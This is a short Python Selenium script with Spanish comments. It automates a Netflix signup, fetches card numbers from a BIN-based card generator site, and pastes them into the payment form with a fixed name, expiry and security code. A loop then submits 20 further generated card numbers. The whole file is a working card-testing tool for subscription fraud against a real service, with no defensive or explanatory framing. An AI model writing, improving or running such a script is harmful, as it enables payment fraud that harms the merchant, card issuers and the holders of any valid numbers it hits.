from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import random

#Vairbales
email = input('Digita el correo que deseas usar--> ')

driver = webdriver.Firefox()

driver.get('https://www.netflix.com/co/')


time.sleep(1)

usuario = driver.find_element(By.XPATH,'//*[@id="id_email_hero_fuji"]')
usuario.send_keys(email)
usuario.send_keys(Keys.ENTER)
time.sleep(3)

button = driver.find_element(By.CLASS_NAME, "nf-btn")
button.click()

#nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize

continuar3=driver.find_element(By.XPATH,'//*[@id="id_password"]')
continuar3.send_keys('123456')
continuar3.send_keys(Keys.ENTER)
time.sleep(2)

metodo_pago=driver.find_element(By.XPATH,'/html/body/div[1]/div/div/div[2]/div/div[2]/button')
metodo_pago.click()
time.sleep(0.5)


continuar4 = driver.find_element(By.CLASS_NAME, "nf-btn")
continuar4.click()
time.sleep(0.5)

driver.get('https://www.netflix.com/signup/creditoption')

driver.execute_script('window.open('');')#Esta instruccion es propia de python ('')<--aqui queda guarda 
time.sleep(0.5)
driver.switch_to.window(driver.window_handles[1])
driver.get('https://namso.ccgen.co/')
time.sleep(0.5)
bin=driver.find_element(By.XPATH,'//*[@id="ccpN"]')
bin.send_keys('512112xxxxxxxxxx')
time.sleep(1)
fecha=driver.find_element(By.XPATH,'//*[@id="ccexpdat"]')
fecha.click()
time.sleep(1)
ccv=driver.find_element(By.XPATH,'//*[@id="ccvi"]')
ccv.click()
time.sleep(1)
cantidad= driver.find_element(By.XPATH,'/html/body/div/div[2]/div/div/div/section/div[2]/article/div[1]/div/form/div[2]/div[5]/p/input')
cantidad.clear()#limpiar campo
cantidad.send_keys('1')
generar= driver.find_element(By.XPATH,'//*[@id="generar"]')
generar.click()
cc=driver.find_element(By.XPATH,'//*[@id="output2"]')
cc.send_keys(Keys.CONTROL, 'a') #hSeleccionar todo
cc.send_keys(Keys.CONTROL, 'c') #copy

#nos movemos a la otra ventana
driver.switch_to.window(driver.window_handles[0])

nombre=driver.find_element(By.XPATH,'//*[@id="id_firstName"]')
nombre.send_keys('alverto')


apellido=driver.find_element(By.XPATH,'//*[@id="id_lastName"]')
apellido.click()
apellido.send_keys('mendez diaz')

numcc= driver.find_element(By.XPATH,'//*[@id="id_creditCardNumber"]')
numcc.send_keys(Keys.CONTROL,'v')

fecha_de_vencimiento=driver.find_element(By.XPATH,'//*[@id="id_creditExpirationMonth"]')
fecha_de_vencimiento.send_keys('0424')

codigo_de_seguridad= driver.find_element(By.XPATH,'//*[@id="id_creditCardSecurityCode"]')
codigo_de_seguridad.send_keys('487')

iniciar_menbresia=driver.find_element(By.CLASS_NAME,'nf-btn')
iniciar_menbresia.click()


for n in range(20):
    '''c=random.randint(100,999)'''
    driver.switch_to.window(driver.window_handles[0])#netflix
    time.sleep(2)
    driver.switch_to.window(driver.window_handles[1])#namso
    time.sleep(0.5)
    #bin=driver.find_element(By.XPATH,'//*[@id="ccpN"]')
    #bin.clear()
    #bin.send_keys('409744xxxxxxxxxx')
    #time.sleep(1)
    #cantidad= driver.find_element_by_xpath('//*[@id="console"]/table/tbody/tr/td[1]/div[3]/input')
    #cantidad.clear()#limpiar campo
    #cantidad.send_keys('1')
    generar= driver.find_element(By.XPATH,'//*[@id="generar"]')
    generar.click()
    cc=driver.find_element(By.XPATH,'//*[@id="output2"]')
    cc.send_keys(Keys.CONTROL, 'a') #hSeleccionar todo
    cc.send_keys(Keys.CONTROL, 'c') #copy
    time.sleep(2)
    driver.switch_to.window(driver.window_handles[0])#netflix
    numcc= driver.find_element(By.XPATH,'//*[@id="id_creditCardNumber"]')
    numcc.send_keys(Keys.CONTROL, 'a') #hSeleccionar todo
    time.sleep(0.5)
    numcc.send_keys(Keys.DELETE)
    numcc.send_keys(Keys.CONTROL,'v')
    codigo_de_seguridad= driver.find_element(By.XPATH,'//*[@id="id_creditCardSecurityCode"]')
    codigo_de_seguridad.send_keys('487')
    
    '''codigo_de_seguridad.send_keys(Keys.CONTROL,'a')
    time.sleep(0.5)
    codigo_de_seguridad.send_keys(Keys.DELETE) ###EStas 4 lineas es para un ccv random
    codigo_de_seguridad.send_keys(c)'''

    iniciar_menbresia=driver.find_element(By.CLASS_NAME,'nf-btn')
    iniciar_menbresia.click()


